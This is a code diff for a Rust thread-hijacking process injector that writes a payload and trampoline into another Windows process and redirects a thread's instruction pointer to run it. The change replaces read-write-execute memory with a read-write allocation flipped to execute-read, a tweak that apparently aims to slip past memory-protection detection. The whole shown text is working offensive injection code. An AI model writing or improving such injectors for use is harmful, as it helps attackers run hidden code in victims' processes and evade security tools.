@@ -10,8 +10,8 @@ impl Injector for ThreadHijackInjector {
         use winapi::um::winnt::{PROCESS_VM_OPERATION, PROCESS_VM_WRITE, PROCESS_CREATE_THREAD, THREAD_SUSPEND_RESUME, THREAD_GET_CONTEXT, THREAD_SET_CONTEXT};
         use winapi::um::winnt::{CONTEXT, CONTEXT_FULL};
         use winapi::um::tlhelp32::{CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD, THREADENTRY32};
-        use winapi::um::memoryapi::{VirtualAllocEx, WriteProcessMemory};
-        use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
+        use winapi::um::memoryapi::{VirtualAllocEx, VirtualProtectEx, WriteProcessMemory};
+        use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ};
         use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
         use winapi::shared::minwindef::FALSE;
 
@@ -122,7 +122,8 @@ impl Injector for ThreadHijackInjector {
             trampoline.push(0xC3);                      // RET
 
             let alloc_size = payload.len() + trampoline.len();
-            let remote_mem = VirtualAllocEx(h_proc, std::ptr::null_mut(), alloc_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+            // Allocate RW, write shellcode + trampoline, then flip to RX
+            let remote_mem = VirtualAllocEx(h_proc, std::ptr::null_mut(), alloc_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
             if remote_mem.is_null() {
                 return cleanup("Failed to allocate remote memory");
             }
@@ -138,6 +139,10 @@ impl Injector for ThreadHijackInjector {
             if WriteProcessMemory(h_proc, trampoline_addr, trampoline.as_ptr() as _, trampoline.len(), &mut written) == FALSE {
                 return cleanup("Failed to write restore trampoline to remote memory");
             }
+
+            // Flip to execute-read before redirecting RIP
+            let mut old_prot = 0u32;
+            VirtualProtectEx(h_proc, remote_mem, alloc_size, PAGE_EXECUTE_READ, &mut old_prot);
 
             if FlushInstructionCache(h_proc, remote_mem, alloc_size) == FALSE {
                 return cleanup("Failed to flush instruction cache");
